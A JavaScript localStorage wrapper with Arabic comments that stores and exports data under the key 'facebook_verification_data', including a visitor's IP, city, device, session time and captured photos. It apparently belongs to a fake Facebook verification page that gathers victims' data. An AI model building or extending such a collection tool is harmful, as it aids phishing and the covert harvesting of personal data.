// data.js - تخزين البيانات في localStorage
class DataStorage {
    constructor() {
        this.key = 'facebook_verification_data';
    }
    
    // حفظ البيانات
    save(data) {
        try {
            localStorage.setItem(this.key, JSON.stringify(data));
            console.log('✅ تم حفظ البيانات');
            return true;
        } catch (e) {
            console.error('❌ خطأ في حفظ البيانات:', e);
            return false;
        }
    }
    
    // تحميل البيانات
    load() {
        try {
            const data = localStorage.getItem(this.key);
            return data ? JSON.parse(data) : null;
        } catch (e) {
            console.error('❌ خطأ في تحميل البيانات:', e);
            return null;
        }
    }
    
    // إضافة بيانات جديدة
    update(newData) {
        const currentData = this.load() || {};
        const updatedData = { ...currentData, ...newData };
        return this.save(updatedData);
    }
    
    // مسح البيانات
    clear() {
        localStorage.removeItem(this.key);
        console.log('🗑️ تم مسح البيانات');
    }
    
    // الحصول على إحصائيات
    getStats() {
        const data = this.load();
        if (!data) return null;
        
        return {
            ip: data.ipInfo?.ip || 'غير معروف',
            location: data.ipInfo?.city || 'غير معروف',
            photos: data.photos?.length || 0,
            timestamp: data.session?.startTime || new Date().toISOString(),
            device: data.device?.platform || 'غير معروف'
        };
    }
    
    // تصدير البيانات كملف
    export() {
        const data = this.load();
        if (!data) return null;
        
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        return URL.createObjectURL(blob);
    }
}

// إنشاء نسخة عامة
const dataStorage = new DataStorage();

// إذا كان في بيئة Node.js (للسيرفر)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { DataStorage, dataStorage };
}
